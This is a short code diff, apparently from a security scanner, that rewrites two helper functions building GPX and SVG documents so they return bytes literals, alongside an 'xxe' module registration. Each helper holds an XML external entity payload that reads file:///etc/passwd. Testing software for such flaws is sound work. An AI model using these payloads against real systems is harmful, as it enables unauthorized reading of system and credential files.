@@ -68,18 +68,18 @@ def _winini_doc(root: str = "root") -> bytes:
 def _gpx_doc() -> bytes:
     # GPX skeleton so a GPX parser reaches the entity in <name>.
     return (
-        '<?xml version="1.0"?>\n'
-        '<!DOCTYPE gpx [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n'
-        '<gpx version="1.1"><wpt lat="0" lon="0"><name>&xxe;</name></wpt></gpx>'
-    ).encode()
+        b'<?xml version="1.0"?>\n'
+        b'<!DOCTYPE gpx [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n'
+        b'<gpx version="1.1"><wpt lat="0" lon="0"><name>&xxe;</name></wpt></gpx>'
+    )
 
 
 def _svg_doc() -> bytes:
     return (
-        '<?xml version="1.0"?>\n'
-        '<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n'
-        '<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>'
-    ).encode()
+        b'<?xml version="1.0"?>\n'
+        b'<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n'
+        b'<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>'
+    )
 
 
 @module("xxe", "XML External Entity (XXE)", destructive=True)
